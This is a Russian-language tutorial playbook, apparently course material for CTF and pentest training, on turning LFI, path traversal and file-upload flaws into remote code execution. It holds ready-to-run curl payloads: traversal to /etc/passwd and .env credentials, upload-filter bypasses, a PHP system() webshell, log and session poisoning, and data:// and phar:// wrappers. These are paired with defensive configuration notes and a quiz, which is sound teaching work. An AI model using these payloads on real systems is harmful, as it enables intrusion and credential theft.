---
id: web-playbook-file-to-rce
title: "Плейбук: от файлового примитива до RCE"
category: web
parent: web-playbooks-exploit
difficulty: hard
order: 2
tags: [playbook, file-upload, lfi, traversal, rce, webshell, wrappers, decision-tree, web]
prerequisites: [web-file-upload, web-lfi-path-traversal, web-playbook-recon-to-foothold]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Decision-tree: загрузка файла / LFI / traversal → обход фильтров → чтение файлов → путь к исполнению кода (webshell, log poisoning, /proc, wrappers, phar)."
---

## Задача

Ты нашёл файловый примитив на `https://shop.target.local`: параметр `?page=` и форму загрузки. Вопрос — **как из «читаю файлы» получить исполнение кода**. Этот плейбук — дерево от определения примитива до webshell.

## Данные, с которыми работаем

Параметр `GET /index?page=...` и `POST /upload` (multipart, поле `file`). Пройдём: определить примитив → прочитать файлы → найти точку исполнения → webshell.

## Дерево решения

```
[файловый примитив]
   ├─(1) ОПРЕДЕЛИТЬ
   │      ├─ загрузка файла ──► (2) upload bypass
   │      ├─ чтение по пути (?file=/page=) ──► (3) LFI/traversal
   │      ├─ распаковка архива ──► ZIP-slip / phar
   │      └─ десериализация blob ──► web-deserialization
   ├─(2) UPLOAD BYPASS: тип/расширение/магия
   ├─(3) LFI/TRAVERSAL: прочитать файлы
   ├─(4) ТОЧКА ИСПОЛНЕНИЯ: log poisoning, /proc, wrappers, phar, session
   └─(5) ГДЕ ИСПОЛНЯЕТСЯ ──► [webshell / код / доступ]
```

## Шаг 1: определить примитив

Три разные вещи: **upload** (файл попадает на сервер), **LFI** (сервер отдаёт содержимое файла), **traversal** (можно выйти за каталог).

```bash
# LFI/traversal? параметры, называющие файл
$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
    'https://shop.target.local/index?page=../../../../etc/passwd'
200 1842
$ curl -s 'https://shop.target.local/index?page=../../../../etc/passwd' | grep -m1 'root:x:0:0'
root:x:0:0:root:/root:/bin/bash
```

**Условие ветвления:** видишь `root:x:0:0` → LFI подтверждён. Форма загрузки принимает файл → upload. Оба есть одновременно — комбо сильнее всего: загрузить + включить.

## Шаг 2: LFI/traversal — читать файлы

```bash
# обходы фильтра пути
$ for p in "../../../../etc/passwd" "....//....//....//etc/passwd" \
           "..%2f..%2f..%2fetc/passwd" "..%252f..%252f..%252fetc/passwd" "/etc/passwd"; do
    echo "== $p"
    curl -s --get --data-urlencode "page=$p" https://shop.target.local/index | grep -m1 'root:x:0:0'
  done
== ../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash

# что читать в первую очередь
#   Linux: /etc/passwd, /proc/self/environ, /var/www/html/.env, config.php
#   Windows: C:\Windows\win.ini, web.config
```

**Условие ветвления:** читается `/etc/passwd` → иди за конфигами (`.env`, `config.php` — там креды). Читается `/proc/self/environ` → возможен log poisoning/RCE. Ничего не читается → обходи фильтр.

```bash
# читаем .env — часто там креды БД
$ curl -s 'https://shop.target.local/index?page=/var/www/html/.env'
DB_USER=shop
DB_PASS=Sh0pP@ss
```

## Шаг 3: upload bypass

Фильтры бывают на расширение, MIME, магию и содержимое — обходим слоями.

```bash
# 1) базовый тест
$ echo '<?php echo "PWNED"; ?>' > test.php
$ curl -s -F 'file=@test.php' https://shop.target.local/upload
{"error":"invalid extension"}                     # фильтр расширений

# 2) альтернативные расширения
$ for ext in phtml php5 pht phar inc; do
    cp test.php "test.$ext"
    curl -s -o /dev/null -w "$ext -> %{http_code}\n" -F "file=@test.$ext" https://shop.target.local/upload
  done
phtml -> 200

# 3) обход MIME + магия
$ printf 'GIF89a;<?php echo "PWNED"; ?>' > shell.gif.php
$ curl -s -F 'file=@shell.gif.php;type=image/gif' https://shop.target.local/upload
{"path":"/uploads/shell.gif.php"}
```

**Условие ветвления:** файл принят и доступен → пробуй выполнить. Не исполняется → ищи точку исполнения (шаг 4). Отклоняется → комбинируй имя + MIME + магию + `.htaccess`.

## Шаг 4: точка исполнения — от чтения к коду

Это ядро плейбука. Чтение файлов — ещё не RCE; нужен канал, который **исполнит** твой код.

```bash
# --- PHP wrappers ---
$ curl -s 'https://shop.target.local/index?page=php://filter/convert.base64-encode/resource=index.php'
$ curl -s --get --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+' \
    'https://shop.target.local/index?c=id'

# --- Log poisoning (Apache/nginx) ---
$ curl -s -A '<?php system($_GET["c"]); ?>' https://shop.target.local/ -o /dev/null
$ curl -s 'https://shop.target.local/index?page=/var/log/nginx/access.log&c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# --- Session file ---
$ curl -s -b "PHPSESSID=abcdef" -d 'name=<?php system($_GET["c"]); ?>' https://shop.target.local/profile
$ curl -s 'https://shop.target.local/index?page=/tmp/sess_abcdef&c=id'

# --- phar:// deserialization ---
$ curl -s 'https://shop.target.local/index?page=phar:///var/www/html/uploads/evil.phar/x'
```

**Условие ветвления:** любой канал вернул вывод `id` → у тебя RCE. Немедленно стабилизируй доступ (обратный шелл/туннель), а не «стреляй» по одному запросу многократно.

## Шаг 5: где исполняется загруженный файл

Файл может лежать в `uploads/` без исполнения. Тогда ищем интерпретируемый каталог или комбинируем upload + LFI.

```bash
$ curl -s https://shop.target.local/uploads/shell.gif.php?c=id   # не исполняется -> отдаёт исходник
$ curl -s 'https://shop.target.local/index?page=/var/www/html/uploads/shell.gif.php&c=id'
uid=33(www-data) gid=33(www-data)      # комбо upload + LFI сработало
```

**Условие ветвления:** файл исполняется → RCE. Не исполняется, но есть LFI → включай через LFI. Нет ни того, ни другого → ищи другой канал или цель.

## Почему чтение — ещё не RCE: модель исполнения

Самая частая ошибка на файловых уязвимостях — считать, что «прочитал `/etc/passwd`» равно «получил доступ». Это две разные вещи, и между ними лежит целый шаг. Понять разницу помогает модель того, как веб-сервер обрабатывает файлы.

Когда приходит запрос на PHP-файл, сервер не «отдаёт» его — он передаёт файл интерпретатору. Интерпретатор выполняет код и возвращает результат. А вот текстовый файл, картинку или `.log` сервер просто отдаёт байтами, не исполняя. Поэтому наличие уязвимости чтения (LFI) само по себе даёт только данные. Чтобы получить код, нужно, чтобы **какой-то файл, содержимое которого ты контролируешь, попал в интерпретатор**.

Отсюда все каналы исполнения в этом плейбуке — это способы доставить твой код в интерпретатор. `php://filter` не исполняет, а лишь кодирует содержимое — он полезен для чтения исходников. `data://` и `expect://` — это обёртки, которые интерпретатор выполняет как код, но они требуют `allow_url_include`. Log poisoning обходит требование загрузки: ты пишешь PHP в `User-Agent`, он попадает в `access.log`, а затем LFI включает сам лог как PHP-файл. Session-файл работает так же, только носитель — файл сессии на диске. `phar://` использует тот факт, что PHP при работе с phar-архивом десериализует метаданные.

Каждый канал — это компромисс между условиями. Log poisoning требует известного пути лога и права читать его. Wrappers требуют включённых опций PHP. Session требует, чтобы приложение писало твои данные в файл сессии. Upload требует, чтобы каталог исполнял файлы. Понимание этих условий позволяет не перебирать каналы вслепую, а выбрать тот, чьи условия выполнены в конкретной цели.

И ещё одна важная мысль: комбинация сильнее частей. Upload, который не исполняется сам по себе, плюс LFI, который включает файл, вместе дают RCE. Именно поэтому в дереве шаг «определить примитив» идёт раньше шага «найти точку исполнения» — примитивы комбинируются.

Держи в уме и защитную сторону: почти все каналы исполнения закрываются конфигурацией. `allow_url_include = off` убирает `data://` и `expect://`; вынос загружаемых файлов за пределы webroot без права исполнения ломает upload-цепочку; логи, недоступные для чтения через LFI, лишают смысла poisoning. Поэтому когда вектор не срабатывает, полезно посмотреть не на payload, а на то, какая именно настройка его остановила — это подсказывает, какой канал остался открытым.

## Полный прогон от начала до конца

1. `?page=../../../../etc/passwd` → `root:x:0:0` → LFI подтверждён.
2. `?page=/var/www/html/.env` → креды БД.
3. Загрузка: `.phtml` + `GIF89a` + `image/gif` → файл принят.
4. `uploads/` не исполняет → log poisoning: PHP в `User-Agent`, затем включаем лог.
5. `?page=/var/log/nginx/access.log&c=id` → `uid=33(www-data)` → RCE.

## Если не сработало — пробуй это

- **Фильтр режет `../`.** Абсолютный путь (`/etc/passwd`), двойное кодирование (`..%252f`), `....//`, `php://filter`.
- **Файл не исполняется.** Проверь Content-Type ответа; смени расширение под стек (`.phtml`, `.php5`, `.phar`); используй `.htaccess`/`web.config`.
- **Обход по MIME не проходит.** Комбинируй: имя + `image/png` + магия `GIF89a` + код после магии.
- **Нет логов в известном пути.** Найди реальный путь через LFI (`/etc/nginx/nginx.conf`).
- **Blob/base64 в cookie.** Это десериализация — иди в `web-deserialization`.

## Тупики

- Грузить один `shell.php` снова и снова при фильтре по расширению — обходи имя, а не повторяй.
- Искать исполнение в `uploads/`, смонтированном как static/`noexec` — там его не будет.
- `data://`/`expect://` без `allow_url_include` — не сработают; проверь `php://filter`.
- Логировать в файл, который не можешь прочитать — сначала найди путь логов.
- Перезаписывать существующие файлы при загрузке — можно сломать приложение.

## Что мы теперь знаем

- Сначала определяем примитив: upload / LFI / traversal / распаковка.
- LFI подтверждается чтением `/etc/passwd`; за ним — конфиги с кредами.
- Upload bypass комбинирует расширение + MIME + magic bytes.
- Чтение ≠ RCE: нужна точка исполнения (log poisoning, wrappers, `/proc`, session, phar).
- Комбо upload + LFI часто сильнее каждого по отдельности.

## На что смотреть дальше

- **Не деструктивно.** Пиши webshell в новый файл; не перезаписывай и не удаляй.
- **Стабилизация.** RCE — для бутстрапа; дальше — reverse shell/туннель.
- **Один foothold — не шлюз для флуда.** Не гоняй массовые запросы через нестабильный RCE.
- **ZIP-slip.** Архив с `../` даёт запись webshell в webroot.
- **WAF.** Кодируй путь и payload; пробуй разные каналы исполнения.

## Квиз

Проверь себя.

```quiz
- question: "Параметр page=../../../../etc/passwd вернул root:x:0:0. Что это подтверждает?"
  options:
    - "RCE"
    - "LFI / path traversal — чтение произвольных файлов"
    - "SQLi"
    - "SSRF"
  answer: 1
  explanation: "Чтение файла по относительному пути за пределы каталога — это LFI/traversal, ещё не RCE."
- question: "Что из перечисленного даёт ИСПОЛНЕНИЕ кода, а не только чтение файла?"
  options:
    - "php://filter/convert.base64-encode"
    - "expect://id или data:// с кодом (при allow_url_include)"
    - "/etc/passwd"
    - "robots.txt"
  answer: 1
  explanation: "expect:// и data:// могут исполнить код; php://filter лишь кодирует содержимое."
- question: "Как протащить PHP-код через фильтр по расширению и MIME?"
  options:
    - "Просто повторить shell.php"
    - "Комбинация: имя .gif.php + Content-Type image/gif + магия GIF89a + код после неё"
    - "Отправить пустой файл"
    - "Сменить браузер"
  answer: 1
  explanation: "Обходы комбинируют: двойное расширение, подмена MIME и magic bytes."
- question: "Зачем класть PHP-код в User-Agent?"
  options:
    - "Чтобы ускорить сервер"
    - "Для log poisoning — код попадёт в access.log, который затем включается через LFI"
    - "Чтобы скрыть IP"
    - "Для CSRF"
  answer: 1
  explanation: "Лог-отравление: вредоносный UA попадает в лог, а LFI его исполняет."
- question: "Загруженный файл доступен по URL, но отдаётся как текст. Что делать?"
  options:
    - "Сдаться"
    - "Найти каталог с исполнением, сменить расширение под стек или включить файл через LFI"
    - "Перезапустить сервер"
    - "Отправить ещё раз тот же файл"
  answer: 1
  explanation: "Если каталог не исполняет файлы — ищут другой каталог, расширение или LFI-включение."
```

## Куда дальше

Дальше (`web-playbook-ssrf-to-internal`) мы разберём последний плейбук — от SSRF до внутренней сети и метаданных. А пока главное запомни: файловый примитив — это чтение; RCE появляется только там, где есть точка исполнения.

## Где пригодится

- **CTF (Web):** типовой маршрут upload/LFI → RCE, самый частый источник флагов.
- **Bug bounty:** корректная цепочка «примитив → чтение → исполнение» с доказательством.
- **Пентест:** демонстрация реального воздействия файловых уязвимостей.
- **Работа (AppSec):** понимание, почему валидация загрузок и изоляция каталогов критичны.
